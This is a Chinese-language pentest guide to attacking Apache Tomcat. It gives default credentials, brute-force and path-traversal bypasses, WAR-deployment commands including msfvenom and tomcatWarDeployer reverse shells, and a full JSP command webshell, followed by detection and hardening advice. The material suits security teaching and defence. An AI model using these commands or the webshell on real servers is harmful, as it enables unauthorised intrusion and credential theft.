---
attack_surface:
  - 配置缺陷
  - 认证/授权绕过
  - 注入类
impact:
  - 远程代码执行
  - 信息泄露
  - 权限提升
risk_level: 高
prerequisites:
  - HTTP 协议基础
  - Java Web 应用结构（WAR、Servlet、JSP）
  - HTTP Basic 认证
related_techniques:
  - file-upload
  - waf-bypass
  - parameter-pollution
  - java-deserialization
  - path-traversal
difficulty: 中级
tools:
  - metasploit
  - hydra
  - msfvenom
  - clusterd
  - tomcatwardeployer
---

# Tomcat — Apache Tomcat Attack Surface — Tomcat 攻击面分析

> 关联文档：[File Upload](../../Files/File%20Upload/README.md) · [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md) · [Parameter Pollution](../../Other%20Helpful%20Vulnerabilities/Parameter%20Pollution/README.md) · [Java Deserialization](../../User%20input/Structured%20objects/Deserialization/README.md) · [JBoss](../JBoss/README.md)

---

### 知识路径

```
Tomcat Security（本文档）
  ├── 前置知识：Java Web 应用 — WAR 结构、Servlet API、JSP
  ├── 前置知识：HTTP Basic 认证
  ├── 进阶：AJP 协议攻击（Ghostcat CVE-2020-1938）
  ├── 进阶：Tomcat 上下文中的 Java 反序列化
  │   └── 参见：User input/Structured objects/Deserialization
  ├── 关联：File Upload — Axis2 SOAP → Tomcat webroot JSP 植入
  │   └── 参见：Files/File Upload
  ├── 关联：WAF Bypass — Tomcat 路径解析差异
  │   └── 参见：Proxies/Proxy & WAF Protections Bypass
  ├── 关联：Parameter Pollution — Spring MVC + Tomcat 逗号拼接
  │   └── 参见：Other Helpful Vulnerabilities/Parameter Pollution
  └── 关联：JBoss — 同类 Java 应用服务器
      └── 参见：Web Servers & Middleware/JBoss
```

---

# 0x01 Tomcat 攻击面 — 原理与分类

## 1.1 Tomcat 架构概览

Apache Tomcat 是一个开源的 Java Servlet 容器，实现了 Jakarta Servlet、Jakarta Server Pages（JSP）、Jakarta Expression Language 和 Jakarta WebSocket 规范。其攻击面覆盖多个层次：

- **HTTP Connector** — 默认监听 **8080** 端口（Coyote HTTP/1.1）。同时支持 NIO、NIO2、APR/native。不同 Connector 之间的解析差异创造攻击面（如路径规范化绕过）。
- **AJP Connector** — 反向代理（Apache httpd / Nginx）与 Tomcat 之间的二进制协议，端口 **8009**。历史漏洞：CVE-2020-1938（Ghostcat）允许通过任意 AJP 包注入实现无需认证的文件读取/RCE。
- **Manager 应用** — `/manager/html`（GUI）、`/manager/text`（API）、`/host-manager/html`。受 Basic 认证保护；凭据存储在 `tomcat-users.xml` 中。登录成功 → WAR 部署 → RCE。
- **默认应用** — `/examples`、`/docs`、`/host-manager`、`/manager` 随默认安装提供。`/examples` 包含信息泄露的 Servlet 和存在 XSS 漏洞的 JSP 页面。
- **Servlet 引擎（Catalina）** — 核心 Servlet 容器。`org.apache.catalina` 中的 URL 解析逻辑是路径遍历绕过（`/..;/`、`;param=value`）的源头。
- **部署管道** — WAR 文件热部署到 `webapps/` 目录。可写的 `webapps/`（通过 PUT 方法或文件系统访问）可直接部署 webshell。

默认端口：

| 端口 | 服务 |
|------|------|
| 8080 | HTTP Connector（默认） |
| 8443 | HTTPS Connector |
| 8009 | AJP Connector |
| 8005 | Shutdown 端口（绑定 127.0.0.1） |

## 1.2 攻击面分类

| 类别 | 分类名称 | 典型案例 |
|------|---------|---------|
| 配置缺陷 | 配置缺陷 | 默认凭据、生产环境保留 /examples、可写 webapps、Manager 无 IP 限制 |
| 认证/授权绕过 | 认证/授权绕过 | 路径遍历绕过直达 Manager（`/..;/manager/html`）、双重 URL 编码（CVE-2007-1860 mod_jk） |
| 信息泄露 | 信息泄露 | /examples Servlet、/docs 版本泄露、/manager/status、auth.jsp 回溯泄露密码 |
| 注入类 | 注入类 | WAR 部署（JSP/Servlet 中执行任意代码）、SOAP 上传路径遍历到 Tomcat webroot |
| 协议解析差异 | 协议解析差异 | `;` 路径分隔符混淆（Tomcat vs 反向代理）、`;param=value` 路径段绕过 |

## 1.3 版本演变

| 版本 | 关键变化 |
|------|---------|
| Tomcat 4.x – 6.x | 可通过 `tomcat_enum` 枚举用户名。CVE-2007-1860（mod_jk 双重 URL 编码）。默认提供 /examples。 |
| Tomcat 7.x | /examples 仍存在。路径遍历 `/..;/` 绕过对反向代理映射有效。引入 `manager-gui` 角色。 |
| Tomcat 8.x – 9.x | 9.0.31 前 AJP 默认启用。CVE-2020-1938（Ghostcat）— 通过 AJP 任意文件读取。9.0.31 起 AJP 默认禁用。 |
| Tomcat 10.x | Jakarta EE 9 迁移（`javax.*` → `jakarta.*`）。AJP 默认禁用。部分发行版仍提供默认应用。 |

---

# 0x02 侦察与枚举

## 2.1 发现

Tomcat 通常运行在 **8080** 端口（HTTP）和 **8443** 端口（HTTPS）。特征性的 Tomcat 错误页面可确认服务器身份：

[图片: Tomcat 404 错误页面 — Tesseract 提取："TTP Status 404 — Not Found |Apache Tomca"]

## 2.2 版本识别

```bash
# 从 /docs 索引页的 <title> 中提取版本
curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat
```

版本字符串出现在文档索引页的 HTML `<title>` 标签中。

`/manager/status` 页面（可访问时）同时显示 **Tomcat 版本** 和 **操作系统版本**，有助于漏洞关联。

## 2.3 Manager 文件位置

`/manager` 和 `/host-manager` 目录名可能被修改。建议通过爆破搜索定位这些页面：

```bash
# 常见的检查路径
/manager/html
/manager/text
/manager/status
/host-manager/html
/admin
/manager/html/../;/manager/html  # 路径遍历绕过
```

## 2.4 用户名枚举（Tomcat < 6）

对于 Tomcat 6 之前的版本，可以枚举用户名：

```bash
msf> use auxiliary/scanner/http/tomcat_enum
```

> **限制**：此技术仅对 Tomcat 6 之前的版本有效。新版本不会在认证响应中泄露用户名有效性。

## 2.5 默认凭据

`/manager/html` 目录受 HTTP Basic 认证保护。常见默认凭据：

```
admin:admin
tomcat:tomcat
admin:<留空>
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat
```

自动化凭据测试：

```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```

## 2.6 爆破攻击

```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```

Metasploit 等效模块提供会话感知的凭据测试，支持可配置延迟和成功即停行为。

---

# 0x03 信息泄露与访问绕过

## 3.1 密码回溯泄露

在某些配置下访问 `/auth.jsp` 可能在 Java 异常堆栈回溯中泄露密码。这发生在认证机制抛出未处理异常，将敏感参数包含在回溯输出中时。

> **条件**：需要 `auth.jsp` 存在且应用配置了调试级别的错误输出。默认 Tomcat 安装中不存在 — 通常出现在部署在 Tomcat 上的自定义 Web 应用中。

## 3.2 双重 URL 编码路径遍历（CVE-2007-1860）

### 3.2.1 机制

`mod_jk` 连接器（Apache httpd ↔ Tomcat）在转发请求前进行 URL 解码。对路径遍历序列进行双重编码导致 `mod_jk` 解码一次 → 放行遍历，然后 Tomcat 再次解码 → 处理已遍历的路径。

### 3.2.2 利用

```
# 双重编码遍历直达 Manager 且无需认证
pathTomcat/%252E%252E/manager/html
```

解码链：`%252E%252E` → `%2E%2E` → `..`

> **受影响**：Tomcat 4.x – 6.x 时代的 mod_jk 连接器。需要 `mod_jk` 作为前端连接器。

## 3.3 /examples 目录信息泄露与 XSS

### 3.3.1 机制

Apache Tomcat 4.x 至 7.x 在 `/examples` 目录中包含示例脚本，这些脚本暴露内部应用状态且容易受到 Cross-Site Scripting（XSS）攻击。它们在默认安装中提供，且常被遗留在生产环境中。

### 3.3.2 暴露的端点

JSP 示例（信息泄露型）：

```
/examples/jsp/num/numguess.jsp       — 会话状态泄露
/examples/jsp/dates/date.jsp         — 服务器日期/时间
/examples/jsp/snp/snoop.jsp          — 请求/头/会话转储（最危险）
/examples/jsp/error/error.html       — 错误页面示例
/examples/jsp/sessions/carts.html    — 会话追踪演示
/examples/jsp/checkbox/check.html    — 表单处理示例
/examples/jsp/colors/colors.html     — 颜色偏好演示
/examples/jsp/cal/login.html         — 日历登录示例
/examples/jsp/include/include.jsp    — 服务端包含示例
/examples/jsp/forward/forward.jsp    — 请求转发示例
/examples/jsp/plugin/plugin.jsp      — Applet 插件示例
/examples/jsp/jsptoserv/jsptoservlet.jsp — JSP-to-Servlet 生命周期信息
/examples/jsp/simpletag/foo.jsp      — 自定义标签示例
/examples/jsp/mail/sendmail.jsp      — SMTP 邮件发送（可滥用）
```

Servlet 示例（请求/环境自省）：

```
/examples/servlet/HelloWorldExample      — 基础 Servlet
/examples/servlet/RequestInfoExample     — 请求参数转储
/examples/servlet/RequestHeaderExample   — HTTP 头反射
/examples/servlet/RequestParamExample    — GET/POST 参数回显
/examples/servlet/CookieExample          — Cookie 设置/获取
/examples/servlet/JndiServlet            — JNDI 上下文列表
/examples/servlet/SessionExample         — 会话属性展示
```

Tomcat 文档示例：

```
/tomcat-docs/appdev/sample/web/hello.jsp
```

> **参考资料**：[Rapid7 — Apache Tomcat Example Leaks](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)

## 3.4 路径分隔符混淆导致的路径遍历绕过

### 3.4.1 `/..;/` 遍历

在[存在漏洞的 Tomcat + 反向代理配置](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/)中，路径段 `/..;/` 被反向代理和 Tomcat 以不同方式解释：

```
# 反向代理看到：/lalala/..;/manager/html → 规范化为 /manager/html（拦截）
# 但将字面路径转发给 Tomcat
# Tomcat 的 Catalina Servlet 引擎将 ; 视为路径参数分隔符
# → /lalala/.. 是路径，;/manager/html 是参数
# → 解析为 /manager/html — 绕过代理 ACL
www.vulnerable.com/lalala/..;/manager/html
```

### 3.4.2 `;param=value` 段绕过

在根段中使用路径参数的替代形式：

```
http://www.vulnerable.com/;param=value/manager/html
```

Tomcat 的 `org.apache.catalina.connector.CoyoteAdapter` 将 `;param=value` 解析为附加到根 `/` 的路径参数，保留对分号段后目标路径的访问。这绕过了匹配字面路径前缀的反向代理规则。

> **防御**：配置反向代理拒绝包含 Tomcat 路径参数字符 `;` 的路径。

同样的解析行为也是 Tomcat 出现在 [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md) 上下文中的原因 — `;` 在 Tomcat 中作为路径分隔符但在前端代理中不是，创造了过滤器绕过机会。Spring MVC + Tomcat 的 [Parameter Pollution](../../Other%20Helpful%20Vulnerabilities/Parameter%20Pollution/README.md) 行为（重复参数的逗号拼接）在许多部署中加剧了这一问题。

---

# 0x04 远程代码执行

## 4.1 通过 Manager 部署 WAR 文件

### 4.1.1 机制

Tomcat Web Application Manager 允许已认证用户上传和部署 WAR（Web Application Archive）文件。包含 JSP webshell 的 WAR 可提供以 Tomcat 进程身份执行的即时命令执行。

### 4.1.2 前提条件

- 具有以下角色之一的有效凭据：**manager-gui**、**manager-script**、**admin**
- 角色在 `tomcat-users.xml` 中定义（参见 §5.1）
- Manager 应用必须可访问（未被 IP 限制或移除）

### 4.1.3 通过 API 部署（manager/text）

```bash
# 在指定上下文路径下部署 WAR
curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"

# 取消部署 / 清理
curl "http://tomcat:password@localhost:8080/manager/text/undeploy?path=/monshell"
```

### 4.1.4 限制

- 必须安装 `tomcat6-admin`（Debian）或 `tomcat6-admin-webapps`（RHEL）才能使用 Manager
- 用户必须拥有适当角色（HTML 界面需 `manager-gui`，文本 API 需 `manager-script`）。角色在 `tomcat-users.xml` 中定义 — 文件路径因发行版和版本而异。详见 [§5.1.1](#511-file-discovery) 中的完整路径表。
- 某些 Tomcat 打包方式（如最小化 Docker 镜像）会完全移除 Manager 应用

## 4.2 Metasploit 模块

```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```

此模块自动化 WAR 生成、部署、payload 执行和清理。

## 4.3 MSFVenom JSP 反向 Shell

```bash
# 生成包含 JSP 反向 shell 的 WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LPORT> -f war -o revshell.war
```

通过 Manager GUI 或 API 上传 `revshell.war`，然后通过访问 `http://target:8080/revshell/` 触发 payload。

## 4.4 tomcatWarDeployer.py

[tomcatWarDeployer](https://github.com/mgeeky/tomcatWarDeployer) 是一个专用的 Python 脚本，内置反向和绑定 Shell payload 进行 WAR 部署：

```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git
```

**反向 Shell：**

```bash
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
```

**绑定 Shell：**

```bash
./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```

> **注意**：某些旧版 Java/OS 组合（特别是旧版 Sun JVM）可能无法正确执行 payload。

## 4.5 clusterd 自动化利用

[clusterd](https://github.com/hatRiot/clusterd) 提供针对包括 Tomcat 在内的多种应用服务器的自动化利用：

```bash
clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
```

## 4.6 手动 JSP Web Shell 部署

### 4.6.1 基础命令 Shell（index.jsp）

创建包含以下内容的 `index.jsp`（来自 [tennc/fuzzdb webshell 合集](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)）：

```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

打包并部署：

```bash
mkdir webshell
cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war *
# webshell.war 已创建 — 通过 Manager 上传
```

### 4.6.2 从远程 Shell 快速创建 WAR

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
# 上传到 Manager GUI → 应用部署在 /backup
# 访问 shell：http://tomcat-site.local:8180/backup/cmd.jsp
```

### 4.6.3 替代方案：filebrowser.war

安装 [vonLoesch filebrowser](http://vonloesch.de/filebrowser.html) WAR 以获得功能完整的文件管理、上传、下载和命令执行界面。

---

# 0x05 后渗透与凭据收集

## 5.1 tomcat-users.xml 位置与结构

### 5.1.1 文件发现

```bash
find / -name tomcat-users.xml 2>/dev/null
```

常见位置：

| 发行版 | 路径 |
|--------|------|
| Debian/Ubuntu（Tomcat 9） | `/usr/share/tomcat9/etc/tomcat-users.xml` |
| RHEL/CentOS | `/etc/tomcat/tomcat-users.xml` |
| 手动安装/Docker | `$CATALINA_HOME/conf/tomcat-users.xml` |
| Windows | `C:\Program Files\Apache Software Foundation\Tomcat <ver>\conf\tomcat-users.xml` |

### 5.1.2 文件结构

```xml
[...]
<!--
  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.

  Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only
-->
[...]
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />
<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />
```

### 5.1.3 角色权限

| 角色 | 权限范围 |
|------|---------|
| `manager-gui` | HTML GUI + 状态页面 |
| `manager-script` | HTTP 文本 API + 状态页面（程序化部署所需的最小权限） |
| `manager-jmx` | JMX 代理 + 状态页面 |
| `manager-status` | 仅状态页面（只读） |
| `admin-gui` | `/host-manager/html` — 虚拟主机管理 |

> **后渗透价值**：获取的 `tomcat-users.xml` 凭据可能跨环境复用。仅 `manager-script` 角色就足以通过 `/manager/text` API 部署 WAR — 无需 GUI 访问。

---

# 0x06 防御、加固与工具

## 6.1 检测方法论

### 6.1.1 网络流量检测

| 指标 | 意义 |
|------|------|
| 对 `/manager/text/deploy` 的 `PUT` 或 `POST` | 通过 API 部署 WAR |
| 对 `/examples/servlet/`、`/examples/jsp/snp/snoop.jsp` 的请求 | /examples 信息收集 |
| 路径包含 `%252E`（双重编码的 `.`） | CVE-2007-1860 / mod_jk 遍历 |
| 路径包含 `/..;/` 或 `/;param=value/` 段 | 路径遍历绕过尝试 |
| 带 `.war` multipart 的 `POST /manager/html/upload` | 通过 GUI 上传 WAR |
| 对 `/manager/html` 多次 `401` 响应后出现 `200` | 凭据爆破 |

### 6.1.2 主机端检测

| 指标 | 意义 |
|------|------|
| `webapps/` 中出现与部署时间线不符的新 `.war` 文件 | 未授权应用部署 |
| `webapps/` 中自动解压的 Web 应用目录（如 `/backup/`、`/monshell/`） | WAR 部署痕迹 |
| `.jsp` 文件包含 `Runtime.getRuntime().exec()` | JSP webshell |
| `tomcat-users.xml` 中未授权的条目（`manager-gui` 或 `manager-script` 角色） | 持久化后门账户 |
| 非 Tomcat 用户可写 `$CATALINA_HOME/webapps/` | 文件系统权限弱点 |

## 6.2 加固检查表

### 6.2.1 配置加固

| 措施 | 理由 |
|------|------|
| 生产环境移除 `/examples`、`/docs`、`/host-manager` | 消除信息泄露端点 |
| 删除默认 `tomcat-users.xml` 并从头创建 | 消除默认凭据假设 |
| 通过 `context.xml` 中的 `RemoteAddrValve` 按 IP 限制 `/manager` 访问 | 将 Manager 访问限制在可信网络 |
| 设置 `<Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="127.0.0.1, 192.168.1.0/24"/>` | Manager 的 IP 白名单 |
| 为所有 `tomcat-users.xml` 条目使用强唯一密码 | 防止凭据爆破 |
| 为每个用户仅分配所需的最低角色（优先 `manager-script` 而非 `manager-gui`） | 最小权限原则 |
| 如不需要，在 `server.xml` 中禁用 AJP Connector | 缓解基于 AJP 的攻击（Ghostcat） |
| 仅当反向代理在同一主机时将 AJP 绑定到 `127.0.0.1` | 限制 AJP 暴露面 |
| 以非特权操作系统用户（非 root）运行 Tomcat | 限制 RCE 影响范围 |
| 设置 `<Server port="-1" ...>` 禁用 shutdown 端口（8005） | 防止 shutdown 命令滥用 |
| 移除默认 `ROOT` Web 应用或替换为自定义着陆页 | 减少信息泄露 |

### 6.2.2 监控与响应

| 措施 | 理由 |
|------|------|
| 启用 Tomcat Access Log Valve，记录完整请求 URI 和响应状态码 | 对利用尝试的可见性 |
| 监控 `catalina.out` 中 `/manager` 上下文的 `RuntimeException` | 检测利用失败/成功 |
| 对新的 WAR 部署事件设置告警（JMX 通知或日志解析） | 实时部署检测 |
| 定期运行 `find $CATALINA_HOME/webapps -name "*.jsp" -newer <baseline>` | 检测新 webshell 文件 |
| 保持 Tomcat 更新（订阅 `announce@tomcat.apache.org`） | 及时处理 CVE |

## 6.3 工具清单

| 工具 | 用途 | 参考 |
|------|------|------|
| `tomcat_mgr_login`（MSF） | 凭据爆破 | `auxiliary/scanner/http/tomcat_mgr_login` |
| `tomcat_enum`（MSF） | 用户名枚举（Tomcat <6） | `auxiliary/scanner/http/tomcat_enum` |
| `tomcat_mgr_upload`（MSF） | 自动化 WAR 部署 + RCE | `exploit/multi/http/tomcat_mgr_upload` |
| `tomcatWarDeployer.py` | Python WAR 部署器（含反向/绑定 Shell） | [github.com/mgeeky/tomcatWarDeployer](https://github.com/mgeeky/tomcatWarDeployer) |
| `clusterd` | 多应用服务器利用框架 | [github.com/hatRiot/clusterd](https://github.com/hatRiot/clusterd) |
| `ApacheTomcatScanner` | Tomcat 专用漏洞扫描器 | [github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner) |
| `hydra` | 通用 HTTP 爆破 | 内置 |
| `msfvenom` | WAR payload 生成（`java/jsp_shell_reverse_tcp`） | 内置 |

## 参考资料

- [HackTricks — Tomcat](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
- [Rapid7 — Apache Tomcat Example Script Leaks](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)
- [Acunetix — Tomcat Path Traversal via Reverse Proxy Mapping](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/)
- [mgeeky — tomcatWarDeployer](https://github.com/mgeeky/tomcatWarDeployer)
- [hatRiot — clusterd](https://github.com/hatRiot/clusterd)
- [p0dalirius — ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)
- [tennc — JSP Webshell（fuzzdb）](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)
- [Pentest-Tomcat（参考指南）](https://github.com/simran-sankhala/Pentest-Tomcat)
- [Tomcat 官方安全注意事项](https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html)
